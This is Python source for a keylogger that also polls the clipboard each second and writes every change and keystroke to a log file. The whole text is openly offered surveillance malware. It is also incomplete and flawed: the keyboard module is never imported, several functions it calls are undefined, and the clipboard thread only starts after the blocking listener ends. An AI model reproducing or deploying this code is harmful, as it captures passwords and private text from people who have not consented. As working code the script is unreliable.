import argparse
import logging
import threading
import time
import pyperclip

def monitor_clipboard(log_file):
    recent_value = ""
    while True:
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content != recent_value:
                recent_value = clipboard_content
                with open(log_file, 'a') as file:
                    file.write(f"Clipboard changed: {clipboard_content}\n")
            time.sleep(1)  # Check clipboard every second
        except Exception as e:
            logging.error(f"Clipboard monitoring error: {e}")

def start_keylogger(log_file):
    key = generate_key()
    save_key(key)

    with keyboard.Listener(
        on_press=lambda event: on_press(event, log_file, key),
        on_release=lambda event: on_release(event, log_file, key)
    ) as listener:
        try:
            listener.join()
        except Exception as e:
            logging.error(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="keylogger")
    parser.add_argument("--log-file", default="log.txt", help="Path to the log file")
    args = parser.parse_args()

    # Start the keylogger
    start_keylogger(args.log_file)

    # Start the clipboard monitoring thread
    clipboard_thread = threading.Thread(target=monitor_clipboard, args=(args.log_file,))
    clipboard_thread.daemon = True
    clipboard_thread.start()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping keylogger and clipboard monitoring.")

if __name__ == "__main__":
    main()
